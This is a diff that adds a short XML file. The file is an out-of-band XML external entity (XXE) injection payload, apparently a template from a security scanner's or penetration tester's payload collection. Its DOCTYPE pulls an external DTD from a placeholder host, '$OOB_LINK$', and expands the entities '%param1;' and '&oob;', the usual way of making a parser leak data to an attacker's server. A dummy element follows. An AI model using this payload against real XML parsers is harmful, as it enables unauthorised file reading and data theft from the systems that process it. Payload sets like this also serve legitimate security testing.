@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY % sp SYSTEM "$OOB_LINK$">
+%sp;
+%param1;
+]>
+<r>&oob;</r>
+<xyz timestamp="2010-07-23T20:34:59.300" version="4.2.5">
+    <file name="doesntreallymatterwhatsinhere">
+    </file>
+</xyz>
